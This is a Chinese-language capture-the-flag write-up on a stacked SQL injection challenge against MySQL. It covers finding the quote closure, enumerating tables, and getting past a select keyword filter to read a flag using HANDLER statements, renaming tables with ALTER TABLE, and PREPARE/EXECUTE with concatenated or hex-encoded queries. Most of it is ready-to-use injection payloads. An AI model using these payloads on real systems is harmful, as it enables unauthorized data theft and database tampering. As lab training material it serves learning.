接着判断闭合方式

先输入1查询，有相关回显

接着输入1’，报错，可以断定是字符型，且闭合符号是’，

同时我们确定在本题我们是有可能是能使用报错注入的。

接着我输入

1’and 1=1– -回显如下图，再次输入1’ and 1=2– -无回显，说明确实是’闭合（如果两次回显一样则说明不是’闭合)

接着我们去查看是否有关键字过滤，可以直接输入select(因为mysql查询语句用)，回显

知道select|update|delete|drop|insert|where|都被过滤掉了，并且 /i 不区分大小写

因为select被禁用所以联合查询、报错注入、布尔盲注、时间盲注就都不可以使用，所有我们使用堆叠注入

先尝试输入1’;show database– -

发现可以，接着输入1’; show tables– - 查询表

接着可以看表中的列了，可以知道有两个表，逐一查看

1’;show columns from 1919810931114514– -（注意1919810931114514中使用的是反勾号，而不是单引号）

关于在这里使用 ` 而不是 ’ 的一些解释：

两者在linux下和windows下不同，linux下不区分，windows下区分。

单引号 ’ 或双引号主要用于 字符串的引用符号

反勾号 ` 数据库、表、索引、列和别名用的是引用符是反勾号 (注：Esc下面的键)

有MYSQL保留字作为字段的，必须加上反引号来区分！！！

如果是数值，请不要使用引号。

发现flag，因为在 SQL 注入中无法直接使用 SHOW 命令查看字段内容。SHOW 命令主要用于查看数据库的结构信息（元数据)。所以我们要想其他能够的到字段的方法了。

方法一：直接使用HANDLER

输入1’;HANDLER 1919810931114514 OPEN;HANDLER 1919810931114514 READ FIRST;HANDLER 1919810931114514 CLOSE;

  • handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：

打开表：HANDLER 表名 OPEN ;

查看数据：HANDLER 表名 READ next;

关闭表：HANDLER 表名 READ CLOSE;

方法二：通过修改表名和列名来实现

知道输入1后，默认会显示id为1的数据，可以猜测默认显示的是words表的数据，查看words表结构第一个字段名为id我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：1’; alter table words rename to words1;alter table 1919810931114514 rename to words;alter table words change flag id varchar(50);# ，然后通过1’ or 1 = 1 #，成功获取到flag

更改表名

  • 修改表名：ALTER TABLE 旧表名 RENAME TO 新表名；
  • 修改字段：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；

方法三：预编译

这个方法也可以分两种，

第一种是拼接select关键字，输入1’;PREPARE hacker from concat(‘s’,’elect’, ‘ * from 1919810931114514 ‘);EXECUTE hacker;– -

第二种是直接将select * from 1919810931114514语句进行16进制编码，替换payload

1’;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE hacker;– -

同时，我们也可以先定义一个变量并将sql语句初始化，然后调用

1’;Set @ryxer = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @ryxer;EXECUTE hacker;– -

预编译相当于定一个语句相同，参数不通的Mysql模板，我们可以通过预编译的方式，绕过特定的字符过滤

格式：

PREPARE 名称 FROM Sql语句 ? ;
SET @x=xx;
EXECUTE 名称 USING @x;

举例：查询ID为1的用户：

方法一：
SElECT * FROM t_user WHERE USER_ID = 1

方法二：
PREPARE jia FROM ‘SElECT * FROM t_user WHERE USER_ID = 1’;
EXECUTE jia;

方法三：
PREPARE jia FROM ‘SELECT * FROM t_user WHERE USER_ID = ?’;
SET @ID = 1;
EXECUTE jia USING @ID;

方法四：
SET @SQL=’SElECT * FROM t_user WHERE USER_ID = 1’;
PREPARE ryxer FROM @SQL;
EXECUTE ryxer;
